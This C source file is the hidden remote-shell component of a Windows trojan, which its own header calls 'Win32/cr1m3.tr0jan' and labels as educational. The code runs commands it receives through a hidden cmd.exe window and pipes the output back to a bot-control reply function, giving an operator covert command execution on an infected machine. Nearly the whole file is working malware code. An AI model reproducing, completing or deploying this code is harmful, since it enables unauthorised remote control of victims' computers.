/*
	Educational purposes only
	GPL LICENSE:  @Cr1m3 / JennyLab
	Win32/cr1m3.tr0jan
*/

#include "windows.h"
#include "api.h"
#include "task_reply.h"
#include "shell.h"

int shell_status=0;
PROCESS_INFORMATION pinfo;
STARTUPINFO sinfo;
SECURITY_ATTRIBUTES saAttr; 
DWORD written,readed;
HANDLE pipe_IN_Rd = NULL;
HANDLE pipe_IN_Wr = NULL;
HANDLE pipe_OUT_Rd = NULL;
HANDLE pipe_OUT_Wr = NULL;
void *hThread;
DWORD thID;
	

int __shell_new(char *command) {
	char *reply;
	BOOL bSuccess;
	char process_command[2048];

	if(shell_status==1) {
		return 0;
	}

	reply = (char *)_HeapAlloc(_GetProcessHeap(), 0x00000008, 2000);
	saAttr.nLength = sizeof(SECURITY_ATTRIBUTES); 
	saAttr.bInheritHandle = TRUE; 
	saAttr.lpSecurityDescriptor = NULL; 

	_CreatePipe(&pipe_OUT_Rd, &pipe_OUT_Wr, &saAttr, 0);
	_SetHandleInformation(pipe_OUT_Rd, HANDLE_FLAG_INHERIT, 0); //|0x00000001

	_CreatePipe(&pipe_IN_Rd, &pipe_IN_Wr, &saAttr, 0);
	_SetHandleInformation(pipe_IN_Wr, HANDLE_FLAG_INHERIT, 0);

	_ZeroMemory( &sinfo, sizeof(STARTUPINFO) );
	sinfo.cb = sizeof(STARTUPINFO); 
	sinfo.hStdError = pipe_OUT_Wr;
	sinfo.hStdOutput = pipe_OUT_Wr;
	sinfo.hStdInput = pipe_IN_Rd;
	sinfo.dwFlags |= STARTF_USESTDHANDLES;
	sinfo.wShowWindow = 0x00; // HIDE THIS

	_ZeroMemory(process_command, 2048);
	_snprintf(process_command, 2048, "cmd /C %s", command);

	bSuccess= _CreateProcessA(NULL, 
		  process_command,     // command line 
		  NULL,         
		  NULL,         
		  TRUE,         
		  0,            
		  NULL,         
		  NULL,         
		  &sinfo,  
		  &pinfo);  

	if(bSuccess==FALSE) {
		return 0;
	}


//	_WriteFile(pipe_IN_Wr, data->arg, sizeof(data->arg), &written, NULL);
	_Sleep(1000);
	_ZeroMemory(reply, 2000);
	_SetFileApisToANSI();


	while(_ReadFile(pipe_OUT_Rd, reply, 32, &readed, NULL)==TRUE) {
		__push_reply(reply,2);
		_ZeroMemory(reply, 32);
	
		if(readed<32) {
			break;
		}

	}

	//hThread = _CreateThread(0x00, 0x00, (PTHREAD_START_ROUTINE)__shell_thread,NULL, 0x00, &thID);
	//shell_status++;
	_TerminateProcess(pinfo.hProcess, 0x00);
	_CloseHandle(pinfo.hProcess);
	_CloseHandle(pinfo.hThread);
	_CloseHandle(pipe_IN_Rd);
	_CloseHandle(pipe_IN_Wr);
	_CloseHandle(pipe_OUT_Rd);
	_CloseHandle(pipe_OUT_Wr);
	_TerminateThread(hThread, 0);
	_HeapFree(_GetProcessHeap(), 0x00000001, reply);
	return 1;

}


int __shell_close(void) {
	_TerminateProcess(pinfo.hProcess, 0x00);
	_CloseHandle(pinfo.hProcess);
	_CloseHandle(pinfo.hThread);
	_CloseHandle(pipe_IN_Rd);
	_CloseHandle(pipe_IN_Wr);
	_CloseHandle(pipe_OUT_Rd);
	_CloseHandle(pipe_OUT_Wr);
	_TerminateThread(hThread, 0);
	shell_status = 0;
	return 0;
}


//no used I write code for your example implement it yourself 
unsigned long __stdcall __shell_thread(void *param) {
	char *reply = (char *)_HeapAlloc(_GetProcessHeap(), 0x00000008, 2000);

	while(1) {
		while(_ReadFile(pipe_OUT_Rd, reply, 32, &readed, NULL)==TRUE) {
			__push_reply(reply,OPTION_BOTSHELL);
			_ZeroMemory(reply, 32);
	
			if(readed<32) {
				break;
			}

		}

	}
	_HeapFree(_GetProcessHeap(), 0x00000001, reply);
	_WaitForSingleObject(pinfo.hThread, 0xFFFFFFFF);
	_WaitForSingleObject(pinfo.hProcess, 0xFFFFFFFF);
	shell_status = 0;
	_TerminateThread(hThread, 0);
	return 0;
}












// UN USED
int __shell_write(char *command) {
	unsigned long tmp_written;

	_SetFileApisToANSI();
	//_lstrcatA(command, "\n");
	_WriteFile(pipe_IN_Wr, command, sizeof(command), &tmp_written, NULL);
	//_WriteFile(pipe_IN_Wr, "\n", 1, &tmp_written, NULL);
	return(written);

}

int __shell_read(void) {
	char *reply = (char *)_HeapAlloc(_GetProcessHeap(), 0x00000008, 2000);
	//wchar_t unicode_reply[2000];


	int i = 0;


	
	_SetFileApisToANSI();
	while(_ReadFile(pipe_OUT_Rd, reply, 32, &readed, NULL)==TRUE) {	

		__push_reply(reply,1);
		_ZeroMemory(reply, 2000);

		if(readed<32) {
			break;
		}

	}

	_HeapFree(_GetProcessHeap(), 0x00000001, reply);
	return readed;
}
